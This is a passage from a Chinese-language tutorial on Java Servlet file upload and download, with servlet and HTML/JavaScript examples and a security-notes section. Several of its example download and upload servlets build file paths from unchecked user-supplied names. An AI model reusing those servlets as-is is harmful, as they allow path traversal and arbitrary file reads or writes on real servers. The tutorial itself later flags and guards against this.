request.getParts();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (Part part : parts) &#123;</span><br><span class="line">                <span class="comment">// 获取请求头中的Content-Disposition字段</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">                <span class="comment">// 从请求头中提取文件名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> extractFileName(header);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 排除非文件字段</span></span><br><span class="line">                <span class="keyword">if</span> (fileName != <span class="literal">null</span> &amp;&amp; !fileName.isEmpty()) &#123;</span><br><span class="line">                    <span class="comment">// 写入文件</span></span><br><span class="line">                    part.write(uploadPath + File.separator + fileName);</span><br><span class="line">                    out.println(<span class="string">&quot;&lt;h2&gt;文件 &quot;</span> + fileName + <span class="string">&quot; 上传成功!&lt;/h2&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h2&gt;文件上传失败: &quot;</span> + e.getMessage() + <span class="string">&quot;&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">extractFileName</span><span class="params">(String header)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (header == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 从content-disposition头中提取文件名</span></span><br><span class="line">        <span class="comment">// 格式: form-data; name=&quot;file&quot;; filename=&quot;example.jpg&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (String token : header.split(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (token.trim().startsWith(<span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 提取文件名并去除引号</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> token.substring(token.indexOf(<span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>).trim().replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="comment">// 如果是IE浏览器，获取真实的文件名</span></span><br><span class="line">                <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">                    fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> fileName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="1-3-前端表单示例"><a href="#1-3-前端表单示例" class="headerlink" title="1.3 前端表单示例"></a>1.3 前端表单示例</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        选择文件: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="2-文件下载实现"><a href="#2-文件下载实现" class="headerlink" title="2. 文件下载实现"></a>2. 文件下载实现</h2><h3 id="2-1-基本下载实现"><a href="#2-1-基本下载实现" class="headerlink" title="2.1 基本下载实现"></a>2.1 基本下载实现</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取要下载的文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.isEmpty()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;文件名不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取文件存储路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath + fileName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!file.exists() || file.isDirectory()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + fileName + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        response.setContentLengthLong(file.length());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出文件内容</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">sos</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                sos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-2-处理中文文件名"><a href="#2-2-处理中文文件名" class="headerlink" title="2.2 处理中文文件名"></a>2.2 处理中文文件名</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">            <span class="comment">// 处理中文文件名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">            String encodedFilename;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据不同浏览器进行不同的编码</span></span><br><span class="line">            <span class="keyword">if</span> (userAgent.contains(<span class="string">&quot;MSIE&quot;</span>) || userAgent.contains(<span class="string">&quot;Trident&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// IE浏览器</span></span><br><span class="line">                encodedFilename = URLEncoder.encode(fileName, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.contains(<span class="string">&quot;Firefox&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Firefox浏览器</span></span><br><span class="line">                encodedFilename = <span class="string">&quot;=?UTF-8?B?&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(fileName.getBytes(<span class="string">&quot;UTF-8&quot;</span>))) + <span class="string">&quot;?=&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Chrome、Safari等其他浏览器</span></span><br><span class="line">                encodedFilename = URLEncoder.encode(fileName, <span class="string">&quot;UTF-8&quot;</span>).replaceAll(<span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 设置响应头</span></span><br><span class="line">            response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + encodedFilename + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            response.setContentLengthLong(file.length());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 输出文件</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">                 <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(in);</span><br><span class="line">                 <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">                <span class="type">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-3-大文件下载处理"><a href="#2-3-大文件下载处理" class="headerlink" title="2.3 大文件下载处理"></a>2.3 大文件下载处理</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download-large&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LargeFileDownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取Range头，支持断点续传</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">range</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Range&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> file.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isPartialContent</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (range != <span class="literal">null</span> &amp;&amp; range.startsWith(<span class="string">&quot;bytes=&quot;</span>)) &#123;</span><br><span class="line">            isPartialContent = <span class="literal">true</span>;</span><br><span class="line">            String[] ranges = range.substring(<span class="string">&quot;bytes=&quot;</span>.length()).split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            start = Long.parseLong(ranges[<span class="number">0</span>]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (ranges.length &gt; <span class="number">1</span> &amp;&amp; !ranges[<span class="number">1</span>].isEmpty()) &#123;</span><br><span class="line">                end = Long.parseLong(ranges[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算实际需要传输的数据长度</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">contentLength</span> <span class="operator">=</span> end - start + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        <span class="keyword">if</span> (isPartialContent) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_PARTIAL_CONTENT); <span class="comment">// 206</span></span><br><span class="line">            response.setHeader(<span class="string">&quot;Content-Range&quot;</span>, <span class="string">&quot;bytes &quot;</span> + start + <span class="string">&quot;-&quot;</span> + end + <span class="string">&quot;/&quot;</span> + file.length());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_OK); <span class="comment">// 200</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + fileName + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        response.setContentLengthLong(contentLength);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出文件内容</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            raf.seek(start);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 计算剩余需要传输的字节数</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">remaining</span> <span class="operator">=</span> contentLength;</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (remaining &gt; <span class="number">0</span> &amp;&amp; (len = raf.read(buffer, <span class="number">0</span>, (<span class="type">int</span>)Math.min(buffer.length, remaining))) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                remaining -= len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="3-文件上传下载的注意事项"><a href="#3-文件上传下载的注意事项" class="headerlink" title="3. 文件上传下载的注意事项"></a>3. 文件上传下载的注意事项</h2><h3 id="3-1-上传相关注意事项"><a href="#3-1-上传相关注意事项" class="headerlink" title="3.1 上传相关注意事项"></a>3.1 上传相关注意事项</h3><ol><li><p><strong>文件大小限制</strong>：设置合理的文件大小限制，防止服务器资源被耗尽。</p></li><li><p><strong>文件类型验证</strong>：验证上传文件的类型，避免恶意文件被上传。</p></li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件类型验证</span></span><br><span class="line"><span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> part.getContentType();</span><br><span class="line"><span class="keyword">if</span> (contentType != <span class="literal">null</span> &amp;&amp; !contentType.startsWith(<span class="string">&quot;image/&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;仅允许上传图片文件!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol start="3"><li><strong>文件名安全处理</strong>：避免使用用户提供的原始文件名，可以使用UUID重命名文件。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成唯一文件名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">originalFileName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(item.getName()).getName();</span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> UUID.randomUUID().toString() + extension;</span><br></pre></td></tr></table></figure></div><ol start="4"><li><strong>防止目录遍历攻击</strong>：验证文件名，确保不包含路径分隔符。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证文件名</span></span><br><span class="line"><span class="keyword">if</span> (fileName.contains(<span class="string">&quot;..&quot;</span>) || fileName.contains(<span class="string">&quot;/&quot;</span>) || fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;非法的文件名&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-2-下载相关注意事项"><a href="#3-2-下载相关注意事项" class="headerlink" title="3.2 下载相关注意事项"></a>3.2 下载相关注意事项</h3><ol><li><strong>文件路径安全</strong>：避免通过参数直接指定下载文件的路径，防止路径遍历漏洞。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不安全的写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">insecurePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(insecurePath); <span class="comment">// 危险！可能导致任意文件读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全的写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"><span class="comment">// 验证文件名是否合法</span></span><br><span class="line"><span class="keyword">if</span> (fileName.contains(<span class="string">&quot;..&quot;</span>) || fileName.contains(<span class="string">&quot;/&quot;</span>) || fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;非法的文件名&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">securePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br></pre></td></tr></table></figure></div><ol start="2"><li><strong>下载权限控制</strong>：确保用户有权限下载请求的文件。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例：检查用户权限</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user == <span class="literal">null</span> || !hasDownloadPermission(user, fileName)) &#123;</span><br><span class="line">    response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;没有权限下载此文件&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol start="3"><li><strong>文件类型检测</strong>：根据文件类型设置正确的Content-Type。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据文件扩展名设置Content-Type</span></span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line"><span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> <span class="string">&quot;application/octet-stream&quot;</span>; <span class="comment">// 默认二进制流</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (extension) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;pdf&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;application/pdf&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;jpg&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;jpeg&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;image/jpeg&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;png&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;image/png&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 其他文件类型...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response.setContentType(contentType);</span><br></pre></td></tr></table></figure></div><h2 id="4-最佳实践"><a href="#4-最佳实践" class="headerlink" title="4. 最佳实践"></a>4. 最佳实践</h2><h3 id="4-1-使用进度条显示上传-x2F-下载进度"><a href="#4-1-使用进度条显示上传-x2F-下载进度" class="headerlink" title="4.1 使用进度条显示上传&#x2F;下载进度"></a>4.1 使用进度条显示上传&#x2F;下载进度</h3><p>前端JavaScript代码示例：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;uploadForm&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;progress&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;progress-bar&quot;</span> <span class="attr">id</span>=<span class="string">&quot;progressBar&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 0%;&quot;</span>&gt;</span>0%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">    formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 监听上传进度</span></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;progress&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (event.<span class="property">lengthComputable</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> percentComplete = (event.<span class="property">loaded</span> / event.<span class="property">total</span>) * <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;progressBar&#x27;</span>).<span class="property">style</span>.<span class="property">width</span> = percentComplete + <span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;progressBar&#x27;</span>).<span class="property">textContent</span> = percentComplete.<span class="title function_">toFixed</span>(<span class="number">2</span>) + <span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span 